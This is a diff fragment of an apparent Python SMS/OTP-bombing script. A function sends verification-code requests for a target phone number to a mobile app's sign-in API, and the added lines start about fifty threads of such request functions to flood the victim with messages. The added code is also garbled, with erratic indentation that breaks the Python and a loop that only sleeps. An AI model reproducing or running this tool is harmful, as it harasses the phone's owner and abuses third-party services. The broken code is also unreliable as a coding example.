@@ -329,3 +329,65 @@ def test99():
 def test100():
 	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
 		print("กำลังยิง")
+
+for i in range(num):
+	time.sleep(1)
+	
+threading.Thread(target=test).start()
+
+threading.Thread(target=test2).start()
+
+threading.Thread(target=test3).start()
+
+threading.Thread(target=test4).start()
+
+threading.Thread(target=test5).start()
+							threading.Thread(target=test6).start()
+								threading.Thread(target=test7).start()
+									threading.Thread(target=test8).start()
+										threading.Thread(target=test9).start()
+											threading.Thread(target=test10).start()
+												threading.Thread(target=test11).start()
+													threading.Thread(target=test12).start()
+														threading.Thread(target=test14).start()
+															threading.Thread(target=test15).start()
+																threading.Thread(target=test16).start()
+																	threading.Thread(target=test17).start()
+																		threading.Thread(target=test18).start()
+																			threading.Thread(target=test19).start()
+																				threading.Thread(target=test20).start()
+																					threading.Thread(target=test21).start()
+																						threading.Thread(target=test22).start()
+																							threading.Thread(target=test24).start()
+																								threading.Thread(target=test25).start()
+																									threading.Thread(target=test26).start()
+																										threading.Thread(target=test27).start()
+																											threading.Thread(target=test28).start()
+																												threading.Thread(target=test29).start()
+																													threading.Thread(target=test30).start()
+																														threading.Thread(target=test31).start()
+																															threading.Thread(target=test32).start()
+																																threading.Thread(target=test33).start()
+																																	threading.Thread(target=test34).start()
+																																		threading.Thread(target=test35).start()
+																																			threading.Thread(target=test36).start()
+																												
+threading.Thread(target=test37).start()
+
+threading.Thread(target=test38).start()
+
+threading.Thread(target=test39).start()
+
+threading.Thread(target=test40).start()
+
+threading.Thread(target=test41).start()
+
+threading.Thread(target=test42).start()
+						threading.Thread(target=test43).start()
+							threading.Thread(target=test44).start()
+								threading.Thread(target=test45).start()
+									threading.Thread(target=test46).start()
+										threading.Thread(target=test47).start()
+											threading.Thread(target=test48).start()
+												threading.Thread(target=test49).start()
+													threading.Thread(target=test50).start()								
